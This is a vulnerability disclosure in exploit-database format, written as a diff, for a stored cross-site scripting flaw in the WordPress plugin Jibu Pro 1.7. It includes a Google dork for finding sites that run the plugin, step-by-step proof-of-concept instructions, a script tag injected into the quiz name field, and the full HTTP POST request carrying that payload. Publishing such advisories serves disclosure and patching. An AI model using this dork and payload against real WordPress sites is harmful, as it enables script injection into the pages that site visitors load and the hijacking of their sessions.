@@ -1,0 +1,35 @@
+# Exploit Title: WordPress Plugin Jibu Pro 1.7 - Cross-Site Scripting
+# Google Dork: inurl:"/wp-content/plugins/jibu-pro"
+# Date: 2018-08-29
+# Exploit Author: Renos Nikolaou
+# Software Link: https://downloads.wordpress.org/plugin/jibu-pro.1.7.zip
+# Version: 1.7
+# Tested on: Kali Linux
+# CVE: N/A
+# Description: Jinu Pro is prone to Stored Cross Site Scripting vulnerabilities 
+# because it fails to properly sanitize user-supplied input.
+
+# PoC - Stored XSS - Parameter: name
+# 1) Login as a user who have access to Jibu Pro plugin.
+# 2) Jibu-Pro --> Create Quiz.
+# 3) At the Quiz Name type: poc"><script>alert(1)</script>  , then fill the remaining fields and click Save. 
+#   (The first pop-up will appear. Also keep note of the shortcode, similar to: [Test Number])
+# 4) Click Create New Questions, fill the fields and click Save.
+# 5) Copy the Shortcode [Test Number] into any post or page and visit the it via browser.
+
+# Post Request (Step 3):
+
+POST /wordpress/wp-content/plugins/jibu-pro/quiz_action.php HTTP/1.1
+Host: domain.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://domain.com/wordpress/wp-admin/edit.php?page=jibu-pro%2Fquiz_form.php&action=new
+Cookie: wordpress_295cdc576d46a74a4105db5d33654g45
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 512
+
+name=poc"><script>alert(1)</script>&description=poc&passedMark=3&no_of_ques=3&content=Congrats&_wpnonce=c2414882de&_wp_http_referer=/wordpress/wp-admin/edit.php?page=jibu-pro/quiz_form.php&action=new&action=new&quiz=&user_ID=1&submit=Save
